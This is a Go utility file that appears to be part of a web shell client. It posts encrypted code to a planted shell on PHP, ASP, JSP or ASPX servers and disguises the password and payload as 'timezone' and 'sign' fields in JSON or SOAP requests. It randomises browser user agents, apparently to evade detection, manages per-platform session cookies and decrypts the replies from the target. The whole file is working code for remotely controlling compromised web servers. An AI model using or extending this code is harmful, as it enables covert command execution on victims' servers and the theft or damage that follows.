package util

import (
	"bytes"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// GenerateRandomUserAgent returns a randomly selected user agent string.
func GenerateRandomUserAgent() string {
	rand := rand.New(rand.NewSource(time.Now().UnixNano()))
	chromeVersions := []string{"96.0.4664.110", "95.0.4638.69", "94.0.4606.81", "93.0.4577.63", "92.0.4515.159"}
	firefoxVersions := []string{"95.0", "94.0.2", "93.0.1", "92.0", "91.0.2"}
	safariVersions := []string{"15.1", "15.0", "14.1.2", "14.0", "13.1.2"}
	windowsPlatforms := []string{"Windows NT 10.0; Win64; x64", "Windows NT 6.3; Win64; x64", "Windows NT 6.1; Win64; x64"}
	macPlatforms := []string{"Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 10_14_6", "Macintosh; Intel Mac OS X 10_13_6"}
	linuxPlatforms := []string{"X11; Linux x86_64", "X11; Ubuntu; Linux x86_64", "X11; Fedora; Linux x86_64"}

	switch rand.Intn(3) {
	case 0:
		platformGroups := [][]string{windowsPlatforms, macPlatforms, linuxPlatforms}
		platforms := platformGroups[rand.Intn(len(platformGroups))]
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", platforms[rand.Intn(len(platforms))], chromeVersions[rand.Intn(len(chromeVersions))])
	case 1:
		platformGroups := [][]string{windowsPlatforms, macPlatforms, linuxPlatforms}
		platforms := platformGroups[rand.Intn(len(platformGroups))]
		version := firefoxVersions[rand.Intn(len(firefoxVersions))]
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", platforms[rand.Intn(len(platforms))], version, version)
	case 2:
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", macPlatforms[rand.Intn(len(macPlatforms))], safariVersions[rand.Intn(len(safariVersions))])
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

type ShellPostOptions struct {
	Session       string
	ShellType     string
	Headers       map[string]string
	Timeout       time.Duration
	RequestOffset int
}

type ShellPostResult struct {
	Body       string
	Cookie     string
	StatusCode int
}

func PostRequest(shellURL string, password string, code string, session string, args ...any) (string, error) {
	shellType := ""
	for _, arg := range args {
		if s, ok := arg.(string); ok {
			shellType = s
			break
		}
	}
	result, err := PostRequestWithOptions(shellURL, password, code, ShellPostOptions{Session: session, ShellType: shellType})
	if err != nil {
		return "", err
	}
	return result.Body, nil
}

func PostRequestWithoutSession(shellURL string, password string, code string) (string, error) {
	result, err := PostRequestWithOptions(shellURL, password, code, ShellPostOptions{})
	if err != nil {
		return "", err
	}
	return result.Cookie, nil
}

func PostRequestWithOptions(shellURL string, password string, code string, options ShellPostOptions) (ShellPostResult, error) {
	payload, err := json.Marshal(map[string]string{"timezone": password, "sign": code})
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to marshal request json: %w", err)
	}

	req, err := http.NewRequest("POST", shellURL, bytes.NewReader(payload))
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("User-Agent", GenerateRandomUserAgent())
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "*/*")
	if options.Session != "" {
		req.Header.Set("Cookie", FormatCookieHeader(options.Session, options.ShellType))
	}
	for key, value := range options.Headers {
		if key != "" && value != "" {
			req.Header.Set(key, value)
		}
	}

	timeout := options.Timeout
	if timeout <= 0 {
		timeout = 45 * time.Second
	}
	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to execute request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to read response: %w", err)
	}

	result := ShellPostResult{Body: string(body), Cookie: FirstSessionCookie(resp), StatusCode: resp.StatusCode}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return result, fmt.Errorf("unexpected HTTP status %d: %s", resp.StatusCode, trimForError(string(body)))
	}
	return result, nil
}

func PostASMXRequestWithOptions(shellURL string, password string, code string, options ShellPostOptions) (ShellPostResult, error) {
	payload := []byte(`<?xml version="1.0" encoding="utf-8"?>` +
		`<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">` +
		`<soap:Body><ProcessRequest xmlns="http://tempuri.org/">` +
		`<timezone>` + xmlEscape(password) + `</timezone>` +
		`<sign>` + xmlEscape(code) + `</sign>` +
		`</ProcessRequest></soap:Body></soap:Envelope>`)

	req, err := http.NewRequest("POST", shellURL, bytes.NewReader(payload))
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to create asmx request: %w", err)
	}
	req.Header.Set("User-Agent", GenerateRandomUserAgent())
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")
	req.Header.Set("SOAPAction", `"http://tempuri.org/ProcessRequest"`)
	req.Header.Set("Accept", "*/*")
	if options.Session != "" {
		req.Header.Set("Cookie", FormatCookieHeader(options.Session, options.ShellType))
	}
	for key, value := range options.Headers {
		if key != "" && value != "" {
			req.Header.Set(key, value)
		}
	}

	timeout := options.Timeout
	if timeout <= 0 {
		timeout = 45 * time.Second
	}
	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to execute asmx request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ShellPostResult{}, fmt.Errorf("failed to read asmx response: %w", err)
	}

	result := ShellPostResult{Body: string(body), Cookie: FirstSessionCookie(resp), StatusCode: resp.StatusCode}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return result, fmt.Errorf("unexpected HTTP status %d: %s", resp.StatusCode, trimForError(string(body)))
	}
	return result, nil
}

func ExtractASMXResult(body string) string {
	body = strings.TrimSpace(body)
	if body == "" || !strings.Contains(body, "<") {
		return body
	}
	startTag := "<ProcessRequestResult>"
	endTag := "</ProcessRequestResult>"
	start := strings.Index(body, startTag)
	end := strings.Index(body, endTag)
	if start == -1 || end <= start {
		if strings.Contains(body, ":Envelope") || strings.Contains(body, "<soap") {
			return ""
		}
		return body
	}
	value := body[start+len(startTag) : end]
	value = strings.TrimSpace(value)
	if unescaped, err := xmlUnescape(value); err == nil {
		return unescaped
	}
	return value
}

func FirstSessionCookie(resp *http.Response) string {
	for _, cookie := range resp.Cookies() {
		name := strings.ToUpper(cookie.Name)
		if cookie.Value == "" {
			continue
		}
		if name == "PHPSESSID" || name == "JSESSIONID" || name == "ASP.NET_SESSIONID" || strings.HasPrefix(name, "ASPSESSIONID") {
			return cookie.Name + "=" + cookie.Value
		}
	}
	return ""
}

func FormatCookieHeader(session, shellType string) string {
	if session == "" || strings.Contains(session, "=") {
		return session
	}
	switch strings.ToLower(shellType) {
	case "php":
		return "PHPSESSID=" + session
	case "asp":
		return "ASPSESSIONID=" + session
	case "java", "jsp", "jspx":
		return "JSESSIONID=" + session
	case "net", "c#", "aspx", "ashx", "asmx":
		return "ASP.NET_SessionId=" + session
	default:
		return session
	}
}

func GeneratePasswordSeed() string {
	rand := rand.New(rand.NewSource(time.Now().UnixNano()))
	return strconv.Itoa(int(time.Now().Unix()) + rand.Intn(2592000))
}

func HookPost(url, password, code, session, shellType string) (string, error) {
	return HookPostWithOptions(url, password, []byte(code), session, shellType, nil)
}

func HookPostWithOptions(url, password string, code []byte, session, shellType string, headers map[string]string) (string, error) {
	dynamicPassword := GeneratePasswordSeed()
	offset := RequestOffsetForShell(shellType)
	enCode := EncryptWithOffset(code, dynamicPassword, offset)
	enResult, err := PostRequestWithOptions(url, dynamicPassword, enCode, ShellPostOptions{Session: session, ShellType: shellType, Headers: headers, RequestOffset: offset})
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(enResult.Body) == "" {
		return "", fmt.Errorf("empty response from target")
	}
	res, err := DecryptWithOffset(strings.TrimSpace(enResult.Body), dynamicPassword, 5)
	if err != nil {
		return "", err
	}
	return res, nil
}

func RequestOffsetForShell(shellType string) int {
	switch strings.ToLower(shellType) {
	case "php":
		return 1
	default:
		return 5
	}
}

func trimForError(value string) string {
	value = strings.TrimSpace(value)
	if len(value) > 300 {
		return value[:300] + "..."
	}
	return value
}

func xmlEscape(value string) string {
	var buf bytes.Buffer
	_ = xml.EscapeText(&buf, []byte(value))
	return buf.String()
}

func xmlUnescape(value string) (string, error) {
	var out struct {
		Value string `xml:",chardata"`
	}
	if err := xml.Unmarshal([]byte("<x>"+value+"</x>"), &out); err != nil {
		return "", err
	}
	return out.Value, nil
}
